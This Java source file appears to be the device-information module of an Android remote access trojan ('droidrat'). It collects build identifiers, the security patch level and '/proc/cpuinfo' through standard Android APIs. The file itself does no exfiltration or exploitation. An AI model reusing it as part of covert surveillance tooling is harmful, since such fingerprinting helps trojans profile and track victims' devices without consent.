package com.je_chen.droidrat_je.rat.modules.appsinfo.getinfo;

//TODO getPhoneInfo

import android.annotation.SuppressLint;
import android.os.Build;

import java.io.InputStream;

public class GetPhoneInfo {

    //The name of the underlying board, like "goldfish".
    public String getBOARD() {
        return Build.BOARD;
    }

    //The system bootloader version number.
    public String getBOOTLOADER() {
        return Build.BOOTLOADER;
    }

    //The consumer-visible brand with which the product/hardware will be associated, if any.
    public String getBRAND() {
        return Build.BRAND;
    }

    //The name of the industrial design.
    public String getDevice() {
        return Build.DEVICE;
    }

    //A build ID string meant for displaying to the user
    public String getDisplay() {
        return Build.DISPLAY;
    }

    //A string that uniquely identifies this build.
    public String getFINGERPRINT() {
        return Build.FINGERPRINT;
    }

    //The name of the hardware (from the kernel command line or /proc).
    public String getHARDWARE() {
        return Build.HARDWARE;
    }

    public String getHOST() {
        return Build.HOST;
    }

    //Either a changelist number, or a label like "M4-rc20".
    public String getID() {
        return Build.ID;
    }

    //The manufacturer of the product/hardware.
    public String getMANUFACTURER() {
        return Build.MANUFACTURER;
    }

    //The end-user-visible name for the end product.
    public String getModel() {
        return Build.MODEL;
    }

    //The name of the overall product.
    public String getProduct() {
        return Build.PRODUCT;
    }

    //The type of build, like "user" or "eng".
    public String getTYPE() {
        return Build.TYPE;
    }

    public String getUSER() {
        return Build.USER;
    }

    //The internal value used by the underlying source control to represent this build.
    public String getVERSION_INCREMENTAL() {
        return Build.VERSION.INCREMENTAL;
    }

    //The user-visible version string.
    public String getVERSION_RELEASE() {
        return Build.VERSION.RELEASE;
    }

    //The time at which the build was produced, given in milliseconds since the UNIX epoch.
    public String getTime() {
        return String.valueOf(Build.TIME);
    }

    //The SDK version of the software currently running on this hardware device.
    public String getSDKVersion() {
        return String.valueOf(Build.VERSION.SDK_INT);
    }

    @SuppressLint("InlinedApi")
    public String getSecurityVersion() {
        return Build.VERSION.SECURITY_PATCH;
    }

    public String getCPUInfo() {
        StringBuilder output = new StringBuilder();
        try {
            String[] DATA = {"/system/bin/cat", "/proc/cpuinfo"};
            ProcessBuilder processBuilder = new ProcessBuilder(DATA);
            Process process = processBuilder.start();
            InputStream inputStream = process.getInputStream();
            byte[] byteArry = new byte[1024];

            while (inputStream.read(byteArry) != -1) {
                output.append(new String(byteArry)).append("-");
            }
            inputStream.close();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return output.toString();
    }
}
